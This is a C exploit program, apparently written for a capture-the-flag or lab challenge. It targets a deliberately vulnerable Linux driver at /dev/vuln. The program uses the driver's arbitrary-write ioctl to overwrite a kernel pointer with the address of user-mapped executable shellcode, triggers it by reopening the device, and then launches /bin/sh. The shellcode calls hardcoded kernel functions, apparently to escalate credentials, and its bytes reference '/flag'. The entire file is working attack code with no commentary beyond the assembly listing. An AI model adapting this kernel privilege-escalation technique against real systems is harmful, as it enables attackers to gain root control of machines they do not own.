#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

int main (int argc, char **argv){
	/*
	xor rdi, rdi
	mov rcx, 0xffffffff8107c0a0
	call rcx
	mov rdi, rax
	mov rcx, 0xffffffff8107bd20
	call rcx
	ret
	*/
	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\x49\xBF\x2F\x66\x6C\x61\x67\x00\x00\x00\x49\xC7\xC6\x00\xDF\xEA\x0D\x4D\x89\x3E\x48\xBF\x9C\xFF\xFF\xFF\x00\x00\x00\x00\x4C\x89\xF6\x48\xC7\xC2\xFF\x01\x00\x00\x48\xC7\xC1\x50\x1B\x1A\x81\xFF\xD1\x48\xC7\xC7\x00\x00\x00\x01\x48\xC7\xC1\x30\x47\x0C\x81\xFF\xD1\xCC";

	void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(sc_addr, sc, sizeof(sc));
	write64(0xffffffffc0002068, sc_addr);
	open("/dev/vuln", O_RDONLY);
	system("/bin/sh");

	return 0;
}